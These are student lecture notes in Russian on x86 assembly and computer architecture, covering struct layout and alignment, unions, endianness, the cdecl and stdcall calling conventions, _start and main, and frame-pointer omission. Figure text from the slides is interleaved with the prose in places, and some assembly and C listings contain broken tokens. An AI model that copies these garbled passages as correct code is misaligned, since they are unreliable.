Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Массивы структур

   Рассмотрим массив структур. Все элементы массива идут непрерывно, но каждый
элемент имеет свои концовки в виде пустых байт. Для того, чтобы обращаться к
элементам массива структур, сначала необходимо определить размеры всех типов с
учётом требований выравниваний. Например, рассмотрим структуру S3:
struct S3 {
          short i;
          float v;
          short j;
} a [10];
   Для неё определим функцию, которая возвращает поле j по заданному индексу в
массиве структур:
short get_j (int idx ) {
        return a[ idx ].j
}
   Такая функция для данной структуры будет выглядеть в ассемблерном коде (с учётом
всех выравниваний):
;                  eax = idx
                   lea     eax , [eax + 2 * eax] ; 3* idx
                   movsx   eax , word [a + 4 * eax + 8]
   В данном случае размер структуры - это 12, а поле j расположено со смещением 8
внутри структуры.
   Существует просто правило, которое говорит о том, как заполнять место, чтобы было
минимальное количество пустых байтов для выравнивания. Необходимо размещать
поля в структуре не в произвольном порядке, а таким образом, чтобы наиболее крупные
элементы структуры оказались в начале, а маленькие - в конце.


Объединения
   Объединения - очень похожая структура данных. Отличие от структур состоит в том,
что под каждое поле объединения выделяется то же самое место. Графически это можно
представить следующим образом. На рисунке 10.5 представлено расположение в памяти
структуры S1, а на рисунке 10.6 можно увидеть расположение в памяти объединения с
теми же полями, что и структура S1.
struct S1 {
        char c;
        int i [2];


                                          130
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                  double v;                                       i[0]           i[1]
                } *up;                                                     v
        Архитектура ЭВМ и язык ассемблера                                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                 ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
        Падарян struct   S1 {
                Вартан Андроникович                     up+0             up+4СЛЕДИТЕ     up+8
                                                                                     ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU

               char c;
                double
               int  i[2];v;                                                                    © 2021 МГУ/ВМК/СП

        } *sp; double v;
             } *sp;
                      Размещение объединений
                 c 3 байта                i[0]
                                       4 байта       i[1]                                     v
• Память выделяется исходя из размеров максимального
         sp+0     sp+4        sp+8                   sp+16                                                  sp+24
  элемента                                                                                                         22
• Используется толькоРис.
                      одно   поле
                          10.5: Расположение в памяти структуры S1.
  union U1 {
    char c;
    int i[2];                                    c
    double v;                                        i[0]           i[1]
  } *up;                                                     v
  struct S1 {                     up+0        up+4        up+8
    char Рис.
          c; 10.6: Расположение в памяти объединения, имеющего поля как у структуры S1.
    int i[2];
    double v;
  } *sp;
       Порядок байт
  c 3 байта    i[0]        i[1]       4 байта             v
          Данные хранятся в памяти как последовательности байт. Возникает вопрос, где
sp+0       sp+4расположен
        именно         sp+8                   sp+16
                          старший (младший) байт. Существует два разных sp+24
                                                                        порядка:
                                                                                                       22
           • Big-endian (порядок от старшего к младшему). Старший байт имеет наименьший
             адрес.

           • Little-endian (порядок от младшего к старшему). Младший байт имеет наименьший
             адрес. Такой порядок используется на процессорах Intel x86 (IA-32).

          Различие в порядке байт может являться проблемой при пересылке двоичных данных
       между машинами с разной архитектурой. В наше время проблема не так актуальна, так
       как большинство машин имеют Little-endian архитектуру или переключаемый порядок
       байт. Переключаемый порядок байт имеют архитектуры: ARM, PowerPC, Alpha, SPARC
       V9, MIPS, PA-RISC и IA-64.


        Битовые поля
           В языке существует возможность задавать отдельные битовые поля. С ними почти
        всё зависит от конкретной реализации компилятора, потому что идти они могут как в
        одном порядке, так и в другом, могут пересекать границы машинных слов. В результате
        получается почти не переносимый код.
           Пример использования - это применение тех или иных битовых масок, которые будут
        накладываться командами or, and и подобными.


                                                            131
              ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
              МАТЕМАТИКИ И КИБЕРНЕТИКИ
              МГУ ИМЕНИ М.В. ЛОМОНОСОВА
              Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                 ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
              Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




              Немного про функции
                 При вызове функций считаем, что сначала отрабатывает пролог, используется
              указатель фрейма ebp. От нас будет требоваться расписать карту памяти фрейма, в
              котором будут храниться свои и служебные данные. Внутри фрейма будет храниться
              некое текущее состояние вызова (сохранённые регистры,       автоматические локальные
                                                             © 2021 МГУ/ВМК/СП

              переменные).
                 Схема фрейма, когда происходит вызов функции представлена на рисунке 10.7.
держка функций на уровне аппаратуры
тный стек

 растет вниз                                         Фрейм
 нды PUSH и POP, сложение и                     вызывающей
 тание констант из ESP                              функции
                                                                      Аргументы
возврат
 нды CALL и RET                                                   Адрес возврата
                                                    Указатель
ния выполняющихся функций                                         «Старый» ebp
                                                  фрейма ebp
 еке размещаются фреймы                                            Сохраненные
дый фрейм хранит текущее                                             регистры
ояние вызова функции                                                     +
ерхнюю границу указывает EBP                                      Автоматические
 ржимое                                                             локальные
Фактические аргументы/формальные                                   переменные
 араметры
 дрес возврата                                                     «Пространство
 втоматические локальные переменные                                 параметров»
                                                   Указатель
 спомогательные переменные
                                                   стека esp

                                                Рис. 10.7: Фрейм при вызове функции.



              Соглашения CDECL
                Функции поддерживаются на уровне соглашений. Одно из соглашений вызова -
              CDECL, оно является стандартом для операционной системы Linux.

                  • Параметры функции кладутся на стек с обязательным выравниванием по 4-ёх
                    байтной границе (так как адрес возврата занимает 4 байта).

                  • Есть возможность посмотреть, сколько функций вызывается из текущей, какие у них
                    аргументы вызова, сколько под них необходимо байт. Под эти нужды резервируется
                    пространство аргументов, то есть, это пространство переиспользуется. Таким



                                                                132
                    ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
                    МАТЕМАТИКИ И КИБЕРНЕТИКИ
                    МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     образом, нет никаких гарантий, что то, что лежало в пространстве аргументов, при
     возврате туда после вызова функции, сохранит своё значение.

   • Очистка стека от аргументов после вызова функции - это обязанность текущей
     вызывающей функции. Эта очистка проводится перед выходом из функции (в
     других соглашениях вызова это не так).

   • Возвращаемое функцией значение - это eax. Если тип данных 8 байтный, то
     возврат через пару регистров edx:eax. Если структура большого размера, то возврат
     происходит через память.


Сохранение регистров
   В 32-х разрядной машине разницы между Linux и Windows не будет. Регистров 8 штук.
Два - служебные (esp, ebp), остальными можно пользоваться. Тремя можно пользоваться
сразу (сохраняются вызванной функцией, регистры ebx, esi, edi). Ещё три необходимо
сохранять вызывающей функцией (регистры eax, edx, ecx).




                                        133
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
             Архитектура ЭВМ и язык ассемблера                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
             Падарян Вартан Андроникович                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




             Лекция 11. Функция main
             ABI - двоичный интерфейс приложения
                Двоичный интерфейс приложения - это просто некоторый свод правил
            (договорённостей), которого должны придерживаться все программисты (преимущественно
            все, особенно те, которые пишут системный софт). Очень много кода уже давно написано,
            таким образом, несоблюдение сводов правил приведёт к нестыковкам с чужим кодом.
            Двоичный интерфейс задаёт правила взаимодействия между модулями программы на
            уровне исполняемого кода.
                ABI - это один из нижних уровней соглашений, по которым необходимо пройтись.
            Схема уровней интерфейсов представлена на рисунке 11.1. Самый нижний уровень - это
            ISA (instruction set architecture). Этот уровень описывает то, что умеет делать машина.
            Поверх ISA может быть “натянуто” ABI, причём не одно. Над ABI естественным
            образом расположено API (application programming interface) - инструкции в терминах
            языка программирования. Поверх всего располагаются контракты функций. Это
            высокоуровневая логика, которую не выразить в© 2021     МГУ/ВМК/СП
                                                                 терминах      языка программирования
ем элемент в непустой список,
            (например
ли на элемент  и списокдляне списка  можно сказать, что он однонаправленный, имеет в себе int и
                              нулевые.
            другие).
 struct chain chain;
chain {                                        Уровни интерфейсов
   payload;
n *next;
                                                         Контракты
insert(chain* list, chain* elem) {
                                                          функций
== list->next) {

                                                             API
    ebx
    esp, 8
    ebx, dword [esp+16]                                      ABI
    eax, dword [ebx+4]
    eax, eax
    .L22
                                                             ISA
 esp-4
 ebx                                                                 16
                       Рис. 11.1: Уровни интерфейсов соглашений для работы с приложениями.

                Существует небольшая сложность склейки описанных уровней интерфейсов между
             собой.




                                                           134
                   ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
                   МАТЕМАТИКИ И КИБЕРНЕТИКИ
                   МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Функция main
    В Си main - это точка входа в программу. На самом деле программа начинают свою
работу с функции start, а только после запускается main. Утилита nm позволяет напечатать
все метки, которые присутствуют в вызываемой программы.
    Полное дерево вызовов, если аккуратно расписать все вспомогательные библиотечные
функции (код поддержки времени выполнения), будет выглядеть так, как на картинке 11.2.

                                                                      Загрузчик
                                                                      операционной
                                                                      системы
                                                                                Программа
                                                                                начинает
                                                                                работать здесь …

                                                                                       А здесь
                                                                                       начинает
                                                                                       работать код
                                                                                       Си-программы




               Запуск сбора профиля (если эта опция включена)
               http://www.opennet.ru/docs/RUS/gprof/




                                          Рис. 11.2: Полное дерево вызовов.



Начальное состояние стека
   Рассмотрим, что происходит внутри функции _𝑠𝑡𝑎𝑟𝑡. Функция на самом деле
достаточно короткая. Внутри файла main существует прописанное число (в структуре
служебного заголовка), которое является адресом, куда операционная система отдаёт
управление при запуске. По соглашению во время компоновки имя _𝑠𝑡𝑎𝑟𝑡 было
превращено в адрес. В этот момент появляется стек - некое пространство памяти,
подготовленное операционной системой, доступное доля чтения и записи. Кроме того,
операционная система положила на стек определённые данные.
   В самом начале esp показывает на стек, где записано argc (число параметров
командной строки, как минимум это будет 1 - имя запущенной программы всегда
параметр). Далее идёт argv - массив указателей, которые ссылаются на строки.


                                                                135
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Дальше идёт массив указателей, которые ссылаются на переменные окружения (envp).
Переменное окружение представляет собой описание той среды, в которой запущена
программа с помощью пар ключ-значение.
    Например, при запуске чего-либо из командной строчки записывается имя файла, его
можно указать в коротком виде. А далее берётся переменная окружения PATH=dir1:dir2,
где dir1, dir2 - имена директорий.
    Выше по стеку располагаются все сточки, на которые идут ссылки ниже. Доаступная
для работы память в каком-то месте кончается. По науке там начинается guard page -
кусок памяти, который операционная система разметила, как недоступный для работы.
Любая попытка что-то там сделать вызовет аварийную остановку. Ниже argc по стеку
тоже находится guard page. Эти guard page контролируют работу со стеком.
    Рассмотрим, что происходит с командами в _𝑠𝑡𝑎𝑟𝑡. Сначала зануляется ebp, потому
что в этот момент он “мусор”. Затем в регистр esi выталкивается величина argc. После
устанавливается регистр ecx на начало argv на стеке. После этого к esp прикладывается
маска, у которой последняя шестнадцатеричная цифра нуль. Это будет выравниванием по
16-ти байтной границе. При этом esp уедет куда-то вниз на стеке. Дальнейший код после
выравнивания готовит параметры для вызова специальной функции __𝑙𝑖𝑏𝑐_𝑠𝑡𝑎𝑟𝑡_𝑚𝑎𝑖𝑛.
    Функция __𝑙𝑖𝑏𝑐_𝑠𝑡𝑎𝑟𝑡_𝑚𝑎𝑖𝑛 в своём заголовке имеет адрес функции main первым
параметром. Кроме того, в параметрах есть argc и верхняя граница с тека, с которой
можно работать. Далее идут адреса функций инициализации, деинициализации,
системной деинициализации. Последний параметр - конец стека. Перед концом на стек
кладётся мусор, так как будет происходить выравнивание.
    Для защиты от разного рода взлома, можно строить код, который не завязан на
конкретные адреса, тогда нельзя будет ими манипулировать. Адреса определяются во
время работы программы. Полный ассемблерный код функции _𝑠𝑡𝑎𝑟𝑡:
080482 e0 <_start >:
80482 e0: xor     ebp , ebp
80482 e2: pop     esi
80482 e3: mov     ecx ,esp
80482 e5: and     esp ,0 xfffffff0
80482 e8: push    eax
80482 e9: push    esp
80482 ea: push    edx
80482 eb: call    8048313 < _start +0 x33 >
80482 f0: add     ebx ,0 x1d10
80482 f6: lea     eax , [ebx -0 x1b80 ]
80482 fc: push    eax
80482 fd: lea     eax , [ebx -0 x1be0 ]
8048303: push     eax



                                        136
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                           КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                 СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




8048304: push                     ecx
8048305: push                     esi
8048306: mov                      eax ,0 x80483fc
804830 c: push                    eax
804830 d: call                    80482 c0 < __libc_start_main@plt >
8048312: hlt
8048313: mov                      ebx , DWORD PTR [esp]
8048316: ret


Команда hlt

   Команда hlt встречается в коде функции _𝑠𝑡𝑎𝑟𝑡. В оригинале она означает, что машина
должна остановиться и ждать каких-то событий (например связанных с вступлением
каких-то данных извне, с переферий). В данном месте смысл этой команды другой.
По дереву вызовов необходимо было дойти до функции exit, а затем операционная
система останавливает работу программы. Таким образом, никак уже не вернуться
на точку, где команда hlt. Например, если возникла какая-то ошибка, то управление
возвращается и попытка выполнить команду hlt в пользовательском режиме приведёт
к аварийной остановке. Дело в том, что команды, которые выполняет машина, делятся
на две категории: пользовательские и системные. Сама операционная система может
выполнять любые команды, а при передачи управления в пользовательскую программу в
некоторых системных регистрах переключается режим, и попытка выполнить системную
команду будет заканчиваться аварийной остановкой. Попытка переписать системные
регистры тоже закончится аварийной остановкой.


Сохранение требований по выравниванию
    При вызове функции main и формировании фреймов определённого размера
сохраняются требования по выравниванию. После того, как начнёт выполняться main,
будет наблюдаться следующая картина. Элемент стека, находящийся над адресом
возврата гарантированно будет выровнен по 16-ти байтной границе. Вторая выровненная
граница будет под argc (рисунок 11.3)
    Действие по выравниванию стека было перенесено из _𝑠𝑡𝑎𝑟𝑡.
    Если рассмотреть ассемблерный код функции main (которая внутри себя вызывает
nullify с аргументами argc, argv):
080483 fc <main >:
80483 fc:          55                                       push    ebp
80483 fd:          89 e5                                    mov     ebp ,esp
80483 ff:          ff 75 0                         cpush    dword [ebp +0 xc]
8048402:           ff 75 08                                 push    dword [ebp +0 x8]


                                                 137
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                     ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                      СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                                адрес возврата

                                                     ebp

                                                     argv

                                                     argc




                                      Рис. 11.3: Фрейм функции main.


8048405:                          e8 ec ff ff ff                 call      nullify
804840 a:                         83 c4 08                       add       esp , 0x8
804840 d:                         b8 00 00 00 00       mov       eax , 0x0
8048412:                          c9                             leave
8048413:                          c3                             ret
...
   После отрабатывания nullify, exp сдвигается на 8, чтобы вернуть сохранённый ebp, eax
зануляется, чтобы вернуть 0.
   Далее идёт команда leave. Эта команда является полным функциональным аналогом
двух команд. Она аналогично следующему коду:
mov                esp , ebp
pop                ebp
   То есть, если стек куда-то передвигался при работе с ним, не используя ebp, с
помощью команды leave можно восстановить esp на нужное место, где ebp уже сохранён,
и восстановить его. Две команды записываются большим числом байт, чем leave, хотя
чем пользоваться - это дело вкуса.


Конструкторы и деструкторы
    Существуют ещё два места, куда можно добавить свой код. Стандарт языка Си ничего
об этом не знает, но компилятору ничто не мешает взять и расширить стандарт. Каждый
компилятор вынужденно вносит расширения. В gcc есть аппарат атрибутов, с помощью
которых можно написать конструкцию с двойными скобками, в которых можно написать
ключевое слово, которое gcc воспримет. В данном случае используются ключевые
слова constructor и destructor (инструкции, которые нужно выполнить до и после работы
программы). Пример того, как можно завести функции с такими ключевыми словами:
void __attribute__ (( constructor ))
my_constructor () {



                                                    138
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




printf ("%s n", __FUNCTION__ );
}
void __attribute__ (( destructor ))
my_destructor () {
printf ("%s n", __FUNCTION__ );
}
    Подчёркивание __𝐹𝑈𝑁𝐶𝑇 𝐼𝑂𝑁__ позволяет напечатать имя текущей функции. В
этих функциях тоже будут сохраняться требования по выравниванию. Для примера
разберём ассемблерный код функции 𝑚𝑦_𝑐𝑜𝑛𝑠𝑡𝑟𝑢𝑐𝑡𝑜𝑟. Сначала происходит стандартный
полог, сохраняется ebp. После выделяем на стеке 8 байт, дополнительно ещё 12, и в этот
момент появляется некоторый параметр. Функция printf заменилась на более простую
puts. Ассемблерный код:
08048426 < my_constructor >:
8048426:         55                                   push      ebp
8048427:         89 e5                     mov        ebp , esp
8048429:         83 ec 08                             sub       esp , 0x8
804842 c:        83 ec 0c                             sub       esp , 0xc
804842 f:        68 10 85 04 08            push       0 x8048510
8048434:         e8 a7 fe ff ff            call       80482 e0 <puts@plt >
8048439:         83 c4 10                             add esp ,0 x10
804843 c:        90                                   nop
804843 d:        c9                                   leave
804843 e:        c3                                   ret
    Конструкторов и деструкторов может быть произвольное число. Рассмотрим, как
происходит их вызов. Компилятор собирает в дополнительную служебную секцию
адреса всех функций со специальными атрибутами. Сейчас эти секции называются
𝑖𝑛𝑖𝑡_𝑎𝑟𝑟𝑎𝑦 и 𝑓 𝑖𝑛𝑖_𝑎𝑟𝑟𝑎𝑦. В них будут некоторые последовательности байт. Если
расписать последовательности, то можно будет увидеть адреса функций. Далее, для
вызова функции происходит call.


Оболочка вокруг main
   Вокруг main можно написать оболочку, которая будет производить выравнивание так,
что внутри оболочки можно писать любой свой код. В результате откроется возможность
свободно вызывать функции стандартной библиотеки.




                                         139
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 12. Особенности архитектуры х86-64.
Выравнивание фрейма
   Ранее мы рассмотрели вопрос распределения данных при создании фрейма. Известно,
что если используется стандартное соглашение cdecl, предполагающая сохранение
регистра ebp, то мы сразу вычитаем восемь байт. Четыре байта идёт на адрес возврата,
четыре – на сохранённые ebp. Остальное пространство (с учётом этих восьми байт)
должно давать в сумме величину, кратную шестнадцати. Если выполнить указанное
соглашение, то, разрабатывал ассемблерный программы, мы получаем возможность
вызывать функции, которые были написаны на языке Си (при условии подключения
нужных библиотек). Если рассматривать обычный персональный компьютер под
управлением Windows/Linux, то нарушение данного соглашения по выравниваю общего
размера фрейма зачастую не вызывает аварийных завершения, а только негативно влияет
на производительность. Однако в некоторых случаях возможно аварийное завершение
программы (например, в случае архитектуры х86 с операционной системой Apple). Это
обосновано тем, что существует отдельно взятая команда MOVDQA, которая выполняет
очень быстрое копирование данных в случае, если данные размещены на определённых
кратных адресах (выровненные данные). Такое предположение позволяет с меньшими
проверками на уровне аппаратуры производить копирование (из-за чего копирование
производится быстрее).


Отказ от указателя фрейма
    Можно предложить некоторые оптимизации, чтобы сократить время соглашения
вызова. Это становится заметным, если тело функции не очень большое. Тогда
создание и освобождение фрейма будут вносить некоторые дополнительные расходы,
сравнимые с полезной нагрузкой. В некоторых ситуациях можно отказываться от
использования указателя фрейма. На его особое применение рассчитывает отладчик
(вопрос соглашения). Если мы собираем программу в так называемом отладочном
режиме, без оптимизации, то нарушение данного соглашения по выравниваю общего
размера фрейма зачастую не вызывает аварийных завершения. Если мы подготавливаем
релизную сборку, чтобы можно было передать то, что мы разработали, потребителям,
то включается оптимизация, которая в том числе меняет работу с ebp. Это означает, что
адресация будет только относительно регистра esp. В этом случае у нас все всегда будет
относительно верхушки стека и придётся больше пересчитывать, большим количеством
смещение добраться до того, что лежит выше адреса возврата. Рассмотрим следующий
пример. Есть некоторая рекурсивная функция, для которой с помощью приведённых
ниже ключей был получен указанный далее ассемблерный листинг:
gcc -S -Os -fomit - frame - pointer -fno - optimize - sibling - calls


                                         140
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                     КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                                     -masm = intel length .c
    Ключ - s нужен для того, чтобы вместо исполняемого кода был построен ассемблерный
листинг. Ключ - OS – оптимизация по размеру, чтобы код получился покороче.
Ключ - fomit-frame-pointer – смена использования регистра ebp. Ключ - fno-optimize-
sibling-calling – разворачиваем рекурсивную функцию в плоский алгоритм, целиком
закодированный в теле функции. Последний запрос: - masm=Intel – вывод в синтаксис
языка Intel. Код выглядит следующим образом:
typedef struct link link ;
struct link {
        int payload ;
        link * next ;
};

int length ( link *p) {
        return p? length (p--> next ) + 1 : 0;
}
Ассемблерный код:
length :
                    sub esp , 12
                    xor eax , eax
                    mov edx , dword [ esp +16]
                    test edx , edx
                    je . L2
                    mov ecx , dword [ edx +4]
                    mov [ esp ], ecx
                    call length
                    inc eax
.L2:
                    add esp , 12
                    ret
   Функция length работает со структурой. После попадания в тело функции
формируется нужный размер фрейма. Первая строка ассемблерного кода создаёт
фрейм размера 16 байт. Параметр р находится по смещению +16.
   Далее считываем edx и проверяем, что он не нулевой. Если он нулевой, мы переходим
к метке .L2, выполнение функции в этот момент сворачивается и мы выходим их функции.
В противном случае, если указатель не нулевой, мы перешагиваем на следующее поле,
вытаскиваем указатель на следующий элемент в однонаправленном списке. Далее ecx
копируется в место, на которое указывает esp и происходит рекурсивный вызов. Когда


                                           141
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                          КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                               ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




мы из него возвращаемся, нужно увеличить eax на единицу, далее – эпилог, увеличение
esp и завершение функции.

   На оптимизацию можно воздействовать отдельными ключами. Например
gcc -S -Os -fno - omit - frame - pointer -fno
   отвечает за требование сохранения ebp. Тогда для того же кода получим ассемблерный
листинг вида
length :
                    push           ebp
                    xor            eax , eax
                    mov            ebp , esp
                    sub            esp , 8
                    mov            edx , dword [ esp +8]
                    test           edx , edx
                    je             .L2
                    mov            ecx , dword [ edx +4]
                    mov            dword [ esp ], ecx
                    call           length
                    inc            eax
.L2:
                    leave
                    ret


Компиляторы и соглашения вызова функции
   Оптимизация вызова функции раньше зависла от компилятора. Сейчас компиляторов
немного:

   • LLVM clang (open source)

             – AMD Optimizing C/C++ Compiler (AOCC)

   • GNU gcc (open source)

   • Microsoft Visual Studio vc

   • Intel icc

   В каждом подобном компиляторе были свои техники ускорения соглашения вызова.
Можно выделить несколько основных соглашений – соглашение вызова, принятое в
операционных системах Windows и соглашение FASTCALL. Рассмотрим соглашение
STDCALL. Пусть дан код:


                                                  142
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                            КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                 ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                  СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




# include <stdio .h>

__attribute__ (( stdcall ))
int sum ( int x, int y);

int       main () {
             int a = 1, b = 2, c;
             c = sum (a , b);
             printf ("\%d n", c);
             return 0;
}

__attribute__ (( stdcall ))
int sum ( int x, int y) {
        int t = x + y;
        return t;
}
Ассемблерный код:
sum :
                     push           ebp
                     mov            ebp , esp
                     mov            eax , dword [ ebp +12]
                     add            eax , dword [ ebp +8]
                     pop            ebp
                     ret            8
    При этом
CMAIN :
                     ; …
                     mov            dword [ esp +4] , 2
                     mov            dword [ esp ], 1
                     call           sum
                     sub            esp , 8
                     mov            dword [ ebp 8] , eax
                     ; …
   STDCALL от CDECL отличается тем, кто будет освобождать стек от аргументов
вызова. Ранее был предложен вариант команды ret с одним операндом (константа,
которая указывает, на сколько байт нужно сдвинуть esp). Такой вариант удобен, если
код пишется вручную либо не очень хорошо компилирующим компилятором. Сейчас


                                                    143
        ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
        МАТЕМАТИКИ И КИБЕРНЕТИКИ
        МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




подобное улучшение не даёт существенного увеличения в скорости. В частности,
соглашение STDCALL не позволяет реализовывать вызовы с переменным числом
параметров, так как вызванная функция имеет чёткое предположение о том, сколько
было параметров, и это число прибавляет esp. В свою очередь CDECL предполагает,
что очищать будет тот, кто вызвал. Поэтому при переменной числе параметров только
он может знать, сколько параметров расположено в стеке. Отметим, что функцию
соглашения STDCALL можно вызывать изнутри функций, работающих в соглашении
CDECL. Для этого надо указать, что соглашение вызова по умолчанию изменилось. В
gcc используется известный механизм атрибутов: __attribute__((stdcall)) – указанная
далее функция будет использовать соглашение STDCALL. Далее она вызывается из
функции main, в которой соглашение CDECL. Тогда нужно учесть, что при возвращении
из функции sum уменьшается размер стека внутри неё. Это нужно компенсировать, что
производится строкой sub esp, 8.


Соглашение FASTCALL
   Соглашение FASTCALL использует для передачи параметров некоторое количество
регистров. Однако, регистров общего назначения очень мало, а параметров может быть
